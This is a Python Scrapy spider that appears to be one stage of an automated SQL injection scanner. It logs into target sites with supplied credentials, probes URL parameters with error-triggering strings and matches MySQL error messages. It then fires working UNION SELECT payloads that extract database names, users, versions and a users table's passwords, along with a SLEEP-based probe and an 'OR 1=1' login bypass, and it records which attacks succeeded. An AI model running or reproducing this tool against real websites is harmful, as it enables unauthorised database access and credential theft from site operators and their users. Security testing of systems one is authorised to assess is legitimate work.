from scrapy.spider import Spider
from scrapy.selector import Selector
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from dirbot.items import Website
from scrapy.selector import HtmlXPathSelector
from scrapy.contrib.exporter import JsonItemExporter
import scrapy
from scrapy.http.request import Request
from scrapy.http import FormRequest
from scrapy import log
from loginform import fill_login_form
from scrapy.xlib.pydispatch import dispatcher
from scrapy import signals
import copy
import json

error_payloads = ["+and+SLAP(10)+--+",
					"'kasdgh",
					"+AND+SEELCT"]
actual_payloads = ["%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%2",
"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+",
"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+",
"%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20+--+",
"%27+and+1=2+union+select+1,2,3+--+",
"+and+SLEEP%2810%29+--+",
"admin%27+OR+1%3D1%23"
]

#links = open('links.txt','r')
#print urls
items = []
fin = []
dic = {}
tempResponse = ""
searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","sqlstate", 
 "different number of columns","cardinality violation"]

class step3(Spider):
	name = "step3"
	
	file4 = open("actualAttacks.txt","w")
	file4.close()
	"""
	with open('Singleinput.json') as data_file:
		data = json.load(data_file)
	start_urls = [data['starturl']]
	login_urls = [data['loginurl']]
	login_user = [data['username']]
	login_pass = [data['password']]
	"""
	main_file = open("Singleinput.json",'r')
	infoList1 = json.load(main_file)
	infoList = infoList1[0]
	for key,value in infoList.iteritems():
		start_urls =  [str(key)]
		login_urls = [value[0].get("loginurl")]
		login_user = [value[0].get("params")[0].get("username")]
		login_pass = [value[0].get("params")[0].get("password")]
		loginRequired = value[0].get("loginRequired")
		domain = start_urls[0][start_urls[0].find("//") + 2:len(start_urls[0])]
	'''
	start_urls = ["https://app4.com"]
	login_urls = ["https://app4.com"]
	login_user = ["admin@admin.com"]
	login_pass = ["admin"]
	'''
	params = []
	loginid = ""
	passid = ""
	login_reqd = "false"
	links = open('linksToAttack.txt','w')

	with open('datalogin.json') as data_file:
		data = json.load(data_file)

	length = len(data)
	for i in range(0,length-1):
		jsonval = json.dumps(data[i])
		data2 = json.loads(jsonval)
		links.write(data2['url']+"\n")
	links.close()
	links = open('linksToAttack.txt', 'r')
	urls = links.readlines()

	def parse(self, response):
		if self.loginRequired == "false":
			print self.domain
			for temp in self.urls:
				login = "false"
				if self.domain in temp:
					yield Request(url=temp, meta={'temp':temp, 'login':login} , callback=self.save_original_resp)
		else:
			#print response
			args, url, method = fill_login_form(response.url, response.body, self.login_user[0], self.login_pass[0])
			print str(args) + " , " + url
			self.login_reqd = "true"
			for a in args:
				if a[1] == self.login_user[0]:
					self.loginid = a[0]
				if a[1] == self.login_pass[0]:
					self.passid = a[0]
			print "IDs: " + self.loginid + ", " + self.passid
			yield FormRequest(url, method=method, meta={'login':self.login_reqd}, formdata=args, callback=self.after_login)
		return

	def __init__(self):
		dispatcher.connect(self.spider_closed, signals.spider_closed)

	def after_login(self, response):
		f = open("res.html", "w")
		f.write(response.body)
		f.close()
		login = response.request.meta['login']
 		if (((("ERROR: Invalid username") or ("The username/password combination you have entered is invalid"))	in response.body) or (response.url is self.start_urls[0])):
			print "			Login failed"
			yield
		# continue scraping with authenticated session...
		else:#elif ("Logout" or "Log out" or "logout" or "log out") in response.body:
			print "Login succeed!" + response.url + " : " + str(len(self.urls))
			#print response.url
			'''f = open("app4login.html", "w")
			f.write(response.body)
			f.close()'''
			#print "response end!!\n"
			for temp in self.urls:
				print self.domain + " " + temp + " " + str(self.domain in temp)
				if self.domain in temp:
					yield Request(url=temp, meta={'temp':temp, 'login':login} , callback=self.save_original_resp)
			#file2 = open("vulnerableinks.txt","w")
			#for item in items:
					#file2.write(item+"\n")
			#write(temp+"\n")
			#file2.close()
			#temp = login_url + attack_url + "?" + query_string
			#yield Request(url=temp, callback=self.save_original_resp)
		return 
	'''
	def after_login(self, response):
		#print "i am here" 
		temp = login_url + attack_url
		##print temp + ": " + str(self.params)
		return FormRequest(temp, formdata=self.params, callback=self.save_original_resp)
	'''
	def save_original_resp(self, response):
		temp = response.request.meta['temp']
		login = response.request.meta['login']
		newfile = open('linksWithFalsePayloads.txt','a')
		print "in original resp" + login
		##print "Response: " + response.url
		file = open("original_response.html", "w")
		file.write(response.body)
		original = response.body
		file.close()
		for error in error_payloads:
				attack_with_payload = temp+error
				newfile.write(attack_with_payload+"\n")
				yield Request(attack_with_payload, meta={'temp':temp,'original':original, 'login':login}, callback=self.save_attack_resp)
				if "&" in temp:
						queryVals = temp.split('&')
						length = len(queryVals)
						for i in range(0,length-1):
								dupVals = copy.copy(queryVals);
								dupVals[i] = dupVals[i]+error
								finLink = "";
								for i in range(0,length-1):
										if i == 0:
												finLink += dupVals[i]
										else:
												finLink += "&"+dupVals[i]
								newfile.write(finLink+"\n")
								yield Request(finLink, meta={'temp':temp,'original':original, 'login':login}, callback=self.save_attack_resp)
		newfile.close()
		return 

	def save_attack_resp(self, response):
		file = open("attack_response.html", "w")
		file.write(response.body)
		file.close()
		
		temp = response.request.meta['temp']
		login = response.request.meta['login']
		original = response.request.meta['original']
		print "in attack resp" + login
		#if searchterms in response.body:
		if any(term in response.body.lower() for term in searchterms):
			print "\tVulnerable link: " + response.url
			#This link is vulnerable lets do the actual attack
			if (temp not in items):
					items.append(temp)
					#UnionAndSelectAttacks
					for actual_payload in actual_payloads:
							attackLink = temp+actual_payload
							yield Request(attackLink, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
							file2 = open("vulnerableinks.txt","w")
							file2.write(temp+"\n")
							if "&" in temp:
									queryVals = temp.split('&')
									length = len(queryVals)
									for i in range(0,length-1):
											dupVals = copy.copy(queryVals);
											dupVals[i] = dupVals[i]+actual_payload
											finLink = "";
											for i in range(0,length-1):
													if i == 0:
														finLink += dupVals[i]
													else:
														finLink += "&"+dupVals[i]
											file2.write(finLink+"\n")
											yield Request(finLink, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
							file2.close()
					#attackLink1 = temp+actual_payloads[0]
					#yield Request(attackLink1, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
					#attackLink2 = temp+actual_payloads[1]
					#yield Request(attackLink2, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
					#attackLink3 = temp+actual_payloads[2]
					#yield Request(attackLink3, meta={'temp':temp, 'original':original, 'login':login}, callback=self.actual_attack_resp)
					#file2 = open("vulnerableinks.txt","w")
					#file2.write(temp+"\n")
					#file2.close()
		return

	def actual_attack_resp(self, response):
		file = open("actual_attack_response.html", "a")
		file.write(response.body)
		file.close()
		attackResponse = response.body
		original = response.request.meta['original']
		file4 = open("justToCheck.txt","a")
		file4.write(response.url)
		file4.close()
		#print "#############################################"
		if not ( attackResponse == original or attackResponse == "" ):
			if not any(term in response.body.lower() for term in searchterms):
				file4 = open("actualAttacks.txt","a")
				file4.write(response.url+"\n")
				file4.close()
				dic1 ={}
				dic1["method"] = "GET" #Pending
				dic1["LoginRequired"] = self.login_reqd
				dic1["username"] = self.login_user[0]
				dic1["password"] = self.login_pass[0]
				dic1["loginid"] = self.loginid
				dic1["passid"] = self.passid
				#print dic1["LoginRequired"]
				#OtherParameterToWrite #Pending
				dic[response.url] = [dic1]
		temp = response.request.meta['temp']
		return

	def spider_closed(self, spider):
		fin.append(dic)
		f = open("step3output.json", 'w')
		f.write(json.dumps(fin,indent= 4, sort_keys = True))
		f.close()
		

